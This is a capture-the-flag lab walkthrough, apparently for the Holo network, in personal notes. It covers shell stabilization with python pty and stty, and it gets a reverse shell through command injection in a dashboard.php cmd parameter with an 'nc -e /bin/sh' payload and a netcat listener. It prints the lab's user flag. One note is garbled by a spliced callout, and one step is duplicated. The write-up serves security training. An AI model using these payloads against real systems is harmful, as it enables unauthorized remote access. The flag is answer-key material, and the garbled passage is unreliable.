Now that we have a shell on the box, we want to stabilize our shell. For the most part, stabilizing shells is straightforward by using other utilities like python to help; however, some steps can take longer or change depending on the shell you use. The below instructions will be for bash and ZSH; any other shells or operating systems, you will need to do your research on stabilizing shells within their environment.  

Instructions found throughout this room are inspired by this fantastic blog post, [https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/](https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/). All credit for the techniques shown goes to ropnop.  

There are several ways to stabilize a shell; we will be focusing on using python to create a pseudo-terminal and modifying stty options. The steps are the same for all target machines, but they may differ depending on the shell or operating system used on your attacking machine.  

To begin, we will create a pseudo-terminal using python. The command can be found below.  

Syntax: `python3 -c 'import pty; pty.spawn("/bin/bash")'`

Once we have a pseudo shell, we can pause the terminal and modify stty options to optimize the terminal. Follow the steps below exactly for bash shells.  

1. `stty raw -echo`

2. `fg`

**Note****:** If you're u> [!INFO]
You have shell onto  L-SRV01.sing ZSH, you **must** combine `stty raw -echo;fg`  onto one line, or else your shell will break  

At this point, you will get your pseudo-terminal back, but you may notice that whatever you type does not show up. For the next step, you will need to type blindly.  

3. `reset`

4. `export SHELL=BASH`

For the next two steps, you will need to use the information you got from step 1. 

5. `export SHELL=BASH`

6. `export TERM=<TERMINAL>`

7. `stty rows <num> columns <cols>`


---

# Your job

## Reverse Shell

- Payload is: `nc+-e+/bin/sh+<tun0 IP>+4444`.
	This tells netcat to send /bin/sh command line to your IP and port. Putting this into the RCE, you get the following URL:
	`admin.holo.live/dashboard.php?cmd=nc+-e+/bin/sh+<tun0 IP>+4444`
- Visit the URL on the browser or on Burp Suite Repeater.

	![[Task 14 - Meterpreter session 1 closed. Reason RUH ROH-20240910150700382.webp]]

## Listener

- On your attacking machine open a netcat listener.

	`nc -lnvp 4444`

- On Repeater click "Send".
	![[Task 14 - Meterpreter session 1 closed. Reason RUH ROH-20240910150823201.webp]]
	You got a Revers Shell.

> [!INFO]
You have shell onto  L-SRV01.
## Stabilize shell

In this case you'll have to use `python3`.
`python3 -c 'import pty; pty.spawn("/bin/bash")'`

## Flag on Docker container

- On the Reverse Shell go to `www-data@555e6e40ede0:/var/www$` and run:
	`cat user.txt`

	HOLO{175d7322f8fc53392a417ccde356c3fe}


- Submit the user flag on Task 4, question 1.


**Next step:** [[Task 15 -  Docker? I hardly even know her!]]
